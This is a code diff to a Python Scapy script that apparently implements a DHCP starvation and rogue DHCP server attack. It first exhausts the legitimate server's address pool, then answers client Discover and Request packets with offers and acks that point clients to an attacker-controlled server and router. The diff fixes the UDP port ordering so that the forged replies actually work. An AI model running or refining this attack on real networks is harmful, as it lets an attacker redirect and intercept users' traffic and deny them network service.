@@ -7,7 +7,7 @@ import ipaddress
 import settings
 
 # EXHAUST IP POOL OF REAL DHCP
-dhcp_exhaust.exhaust()
+dhcp_exhaust.exhaust() # You can comment this line if you want to directly have the rogue DHCP.
 
 ip = ipaddress.ip_address(settings.start_ip)
 database = []
@@ -23,7 +23,7 @@ def process(p):
             print("Discover received")
             dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src=settings.source_ip, dst='255.255.255.255') \
-                        / UDP(sport=68, dport=67) \
+                        / UDP(sport=67, dport=68) \
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'offer'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
                         ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
@@ -33,7 +33,7 @@ def process(p):
             print("Request received")
             dhcp_ack = Ether(dst="ff:ff:ff:ff:ff:ff") \
                         / IP(src=settings.source_ip, dst=str(ip)) \
-                        / UDP(sport=68, dport=67) \
+                        / UDP(sport=67, dport=68) \
                         / BOOTP(op=2, yiaddr=str(ip), siaddr=settings.rogue_serv, chaddr=chaddr, xid=xid) \
                         / DHCP(options=[('message-type', 'ack'),("server_id", settings.rogue_serv), ("broadcast_address", settings.broadcast_address),\
                         ("router", settings.router), ("subnet_mask", settings.subnet_mask), ('end')])
